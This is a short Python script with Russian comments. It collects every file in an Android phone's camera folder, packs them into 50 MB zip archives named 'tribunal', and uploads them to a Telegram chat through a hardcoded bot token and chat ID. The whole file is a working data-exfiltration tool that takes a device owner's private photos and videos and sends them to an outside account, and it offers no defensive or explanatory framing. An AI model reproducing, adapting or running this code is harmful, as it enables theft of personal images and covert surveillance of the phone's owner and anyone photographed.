import os
import zipfile
import math
import telebot


TOKEN = '7359120991:AAG3bv4vB9Gma8m7IXayaH8VuUI-P-b1s7g'
CHAT_ID = '6397620458'
FOLDER_PATH = '/storage/emulated/0/DCIM/Camera'
ZIP_SIZE_LIMIT = 50 * 1024 * 1024  
bot = telebot.TeleBot(TOKEN)

def create_zip_chunks(folder_path, zip_size_limit):
    files = []
    for root, _, filenames in os.walk(folder_path):
        for filename in filenames:
            files.append(os.path.join(root, filename))
    
    total_size = sum(os.path.getsize(f) for f in files)
    num_chunks = math.ceil(total_size / zip_size_limit)  # Закрыта скобка
    
    chunks = [[] for _ in range(num_chunks)]
    current_chunk = 0
    current_chunk_size = 0
    
    for file in files:
        file_size = os.path.getsize(file)
        
        if current_chunk_size + file_size > zip_size_limit and current_chunk < num_chunks - 1:
            current_chunk += 1
            current_chunk_size = 0
        
        chunks[current_chunk].append(file)
        current_chunk_size += file_size
    
    return chunks

def create_zip_files(chunks, output_folder):
    os.makedirs(output_folder, exist_ok=True)  # Проверка на существование папки
    zip_files = []
    for i, chunk in enumerate(chunks):
        zip_filename = os.path.join(output_folder, f'tribunal_{i + 1}.zip')
        try:
            with zipfile.ZipFile(zip_filename, 'w') as zipf:
                for file in chunk:
                    arcname = os.path.relpath(file, FOLDER_PATH)
                    zipf.write(file, arcname)
            zip_files.append(zip_filename)
        except Exception as e:
            print(f"Error creating zip file {zip_filename}: {e}")
    return zip_files

def send_files_via_telegram(zip_files):
    for zip_file in zip_files:
        try:
            with open(zip_file, 'rb') as f:
                bot.send_document(CHAT_ID, f)
        except Exception as e:
            print(f"Error sending file {zip_file}: {e}")

if __name__ == "__main__":
    output_folder = "output"
    chunks = create_zip_chunks(FOLDER_PATH, ZIP_SIZE_LIMIT)
    zip_files = create_zip_files(chunks, output_folder)
    send_files_via_telegram(zip_files)

